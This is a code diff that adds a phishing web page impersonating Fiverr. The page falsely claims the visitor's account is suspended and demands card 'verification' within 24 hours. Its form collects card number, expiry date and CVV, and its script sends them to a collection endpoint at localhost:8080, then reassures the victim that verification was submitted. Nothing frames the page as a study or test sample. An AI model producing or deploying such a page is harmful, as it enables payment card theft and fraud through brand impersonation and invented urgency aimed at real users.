@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Fiverr Verification</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+    body {
+      margin: 0;
+      background-color: #1dbf73;
+      font-family: 'Inter', sans-serif;
+      color: #1a1a1a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 1rem;
+      overflow-x: hidden;
+    }
+
+    .container {
+      background: #fff;
+      max-width: 420px;
+      width: 100%;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+      padding: 2rem 2.5rem;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+    }
+
+    h1 {
+      font-weight: 600;
+      font-size: 1.8rem;
+      margin-bottom: 0.5rem;
+      color: #1dbf73;
+    }
+
+    .receiver {
+      font-weight: 600;
+      font-size: 1.2rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .info {
+      font-size: 1rem;
+      line-height: 1.4;
+      color: #333;
+      margin-bottom: 1.75rem;
+      white-space: pre-line;
+    }
+
+    .status-label {
+      font-weight: 600;
+      font-size: 1rem;
+      margin-bottom: 0.25rem;
+      color: #555;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .status-value {
+      font-weight: 600;
+      font-size: 1.1rem;
+      color: #ff6f61;
+      margin-bottom: 1.5rem;
+    }
+
+    .verify-section {
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+
+    .verify-method {
+      font-weight: 600;
+      font-size: 1rem;
+      margin-bottom: 0.5rem;
+      color: #555;
+      text-align: center;
+    }
+
+    .payment-options {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      margin-top: 0.75rem;
+      max-width: 280px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    label.payment-label {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 1rem;
+      color: #333;
+      user-select: none;
+      gap: 10px;
+    }
+
+    input[type="checkbox"] {
+      margin-right: 12px;
+      width: 18px;
+      height: 18px;
+      cursor: pointer;
+    }
+
+    input[type="checkbox"]:disabled {
+      cursor: not-allowed;
+      accent-color: #aaa;
+    }
+
+    .payment-logo {
+      width: 50px;
+      height: auto;
+      filter: grayscale(0%);
+      display: inline-block;
+    }
+
+    .visa-master-logos {
+      display: inline-flex;
+      gap: 10px;
+      align-items: center;
+      justify-content: center;
+    }
+
+    label.payment-label.disabled {
+      color: #aaa;
+    }
+
+    .verify-btn {
+      background-color: #1dbf73;
+      color: white;
+      font-weight: 600;
+      font-size: 1.1rem;
+      padding: 0.75rem 1.5rem;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 6px 12px rgba(29, 191, 115, 0.7);
+      transition: background-color 0.3s ease, box-shadow 0.3s ease;
+      width: 100%;
+      max-width: 280px;
+      margin: 0 auto;
+      display: block;
+    }
+
+    .verify-btn:hover {
+      background-color: #17a85a;
+      box-shadow: 0 8px 16px rgba(23, 168, 90, 0.9);
+    }
+
+    #cardFormModal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(4px);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
+
+    #cardForm {
+      background: white;
+      border-radius: 12px;
+      padding: 2rem 2.5rem;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+      position: relative;
+      text-align: left;
+      font-size: 1rem;
+      color: #222;
+    }
+
+    #cardForm h2 {
+      color: #1dbf73;
+      font-weight: 700;
+      margin-top: 0;
+      margin-bottom: 1rem;
+      font-size: 1.5rem;
+      text-align: center;
+    }
+
+    #cardForm label {
+      display: block;
+      margin-bottom: 0.3rem;
+      font-weight: 600;
+      color: #555;
+    }
+
+    #cardForm input {
+      width: 100%;
+      padding: 0.5rem 0.75rem;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 1rem;
+      margin-bottom: 1rem;
+      box-sizing: border-box;
+      transition: border-color 0.3s ease;
+    }
+
+    #cardForm input:focus {
+      border-color: #1dbf73;
+      outline: none;
+      box-shadow: 0 0 6px #1dbf73aa;
+    }
+
+    .form-buttons {
+      display: flex;
+      justify-content: space-between;
+      gap: 1rem;
+    }
+
+    #submitCardBtn {
+      flex: 1;
+      background-color: #1dbf73;
+      color: white;
+      font-weight: 700;
+      font-size: 1.1rem;
+      padding: 0.75rem;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 6px 12px rgba(29, 191, 115, 0.7);
+      transition: background-color 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    #submitCardBtn:hover {
+      background-color: #17a85a;
+      box-shadow: 0 8px 16px rgba(23, 168, 90, 0.9);
+    }
+
+    #cancelCardBtn {
+      flex: 1;
+      background-color: #eee;
+      color: #555;
+      font-weight: 700;
+      font-size: 1.1rem;
+      padding: 0.75rem;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    #cancelCardBtn:hover {
+      background-color: #ddd;
+    }
+
+    .input-error {
+      border-color: #e74c3c !important;
+      box-shadow: 0 0 6px #e74c3c88 !important;
+    }
+
+    .error-message {
+      color: #e74c3c;
+      font-size: 0.875rem;
+      margin-top: -0.75rem;
+      margin-bottom: 0.75rem;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Fiverr Verification</h1>
+    <div class="receiver">Receiver name: <strong>Seller</strong></div>
+    <div class="info">
+      The account is currently suspended. To restore your account, please verify your bank card. Please enter and confirm your bank card details within 24 hours. Once verification is complete, your account will be activated. We apologize for any inconvenience caused.
+    </div>
+
+    <div class="status-label">Status:</div>
+    <div class="status-value">Waiting for verification</div>
+
+    <div class="verify-section">
+      <div class="verify-method">How you'll verify</div>
+      <form class="payment-options">
+        <label class="payment-label" for="visa-master">
+          <input type="checkbox" id="visa-master" name="card" value="visa-master" />
+          <span class="visa-master-logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa logo" class="payment-logo" />
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard logo" class="payment-logo" />
+          </span>
+        </label>
+        <label class="payment-label disabled" for="paypal">
+          <input type="checkbox" id="paypal" name="card" value="paypal" disabled />
+          <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal logo" class="payment-logo" />
+        </label>
+      </form>
+    </div>
+
+    <button class="verify-btn" id="verifyButton">Verify</button>
+  </div>
+
+  <div id="cardFormModal">
+    <form id="cardForm" novalidate>
+      <h2>Enter Card Details</h2>
+
+      <label for="cardNumber">Card Number</label>
+      <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required />
+      <div class="error-message" id="cardNumberError"></div>
+
+      <label for="expiryDate">Expiry Date (MM/YY)</label>
+      <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required />
+      <div class="error-message" id="expiryDateError"></div>
+
+      <label for="cvv">CVV / CVC</label>
+      <input type="password" id="cvv" placeholder="123" maxlength="4" required />
+      <div class="error-message" id="cvvError"></div>
+
+      <div class="form-buttons">
+        <button type="button" id="cancelCardBtn">Cancel</button>
+        <button type="submit" id="submitCardBtn">Submit</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const verifyBtn = document.getElementById('verifyButton');
+    const cardFormModal = document.getElementById('cardFormModal');
+    const cardForm = document.getElementById('cardForm');
+    const cancelCardBtn = document.getElementById('cancelCardBtn');
+
+    verifyBtn.addEventListener('click', () => {
+      const selectedCards = Array.from(document.querySelectorAll('input[name="card"]:checked'));
+      if (selectedCards.length === 0) {
+        alert('Please select at least one payment method before verifying.');
+        return;
+      }
+      cardFormModal.style.display = 'flex';
+      document.getElementById('cardNumber').focus();
+    });
+
+    cancelCardBtn.addEventListener('click', () => {
+      cardFormModal.style.display = 'none';
+      cardForm.reset();
+      clearErrors();
+    });
+
+    cardFormModal.addEventListener('click', (e) => {
+      if (e.target === cardFormModal) {
+        cardFormModal.style.display = 'none';
+        cardForm.reset();
+        clearErrors();
+      }
+    });
+
+    function isValidCardNumber(number) {
+      const num = number.replace(/\s+/g, '');
+      return /^[0-9]{13,19}$/.test(num);
+    }
+
+// ...existing code...
+
+function isValidExpiryDate(expiry) {
+  if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
+  const [mm, yy] = expiry.split('/').map(Number);
+  if (mm < 1 || mm > 12) return false;
+  const now = new Date();
+  const currentYear = now.getFullYear() % 100;
+  const currentMonth = now.getMonth() + 1;
+  return yy > currentYear || (yy === currentYear && mm >= currentMonth);
+}
+
+// Add this AFTER the above function:
+const expiryInput = document.getElementById('expiryDate');
+
+expiryInput.addEventListener('input', (e) => {
+  let value = e.target.value;
+
+  // Remove all non-digit chars
+  value = value.replace(/\D/g, '');
+
+  // Insert slash after 2 digits
+  if (value.length > 2) {
+    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+  }
+
+  // Limit length to 5 chars (MM/YY)
+  if (value.length > 5) {
+    value = value.slice(0, 5);
+  }
+
+  e.target.value = value;
+});
+
+// ...rest of your code...
+
+    function isValidCVV(cvv) {
+      return /^[0-9]{3,4}$/.test(cvv);
+    }
+
+    function clearErrors() {
+      ['cardNumberError', 'expiryDateError', 'cvvError'].forEach(id => {
+        document.getElementById(id).textContent = '';
+      });
+      ['cardNumber', 'expiryDate', 'cvv'].forEach(id => {
+        document.getElementById(id).classList.remove('input-error');
+      });
+    }
+
+    cardForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      clearErrors();
+
+      const cardNumber = document.getElementById('cardNumber');
+      const expiryDate = document.getElementById('expiryDate');
+      const cvv = document.getElementById('cvv');
+
+      let valid = true;
+
+      if (!isValidCardNumber(cardNumber.value)) {
+        cardNumber.classList.add('input-error');
+        document.getElementById('cardNumberError').textContent = 'Please enter a valid card number.';
+        valid = false;
+      }
+
+      if (!isValidExpiryDate(expiryDate.value)) {
+        expiryDate.classList.add('input-error');
+        document.getElementById('expiryDateError').textContent = 'Enter valid expiry (MM/YY).';
+        valid = false;
+      }
+
+      if (!isValidCVV(cvv.value)) {
+        cvv.classList.add('input-error');
+        document.getElementById('cvvError').textContent = 'Enter valid CVV (3 or 4 digits).';
+        valid = false;
+      }
+
+      if (valid) {
+  const payload = {
+    cardNumber: cardNumber.value.replace(/\s+/g, ''),
+    expiryDate: expiryDate.value,
+    cvv: cvv.value
+  };
+
+  fetch('http://localhost:8080/api/verify/card', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Failed to submit card verification.');
+    }
+    return response.json();
+  })
+  .then(data => {
+    alert('Verification submitted. Your account will be updated shortly.');
+    cardFormModal.style.display = 'none';
+    cardForm.reset();
+  })
+  .catch(error => {
+    console.error(error);
+    alert('Error submitting card details. Please try again.');
+  });
+}
+
+    });
+  </script>
+</body>
+</html>
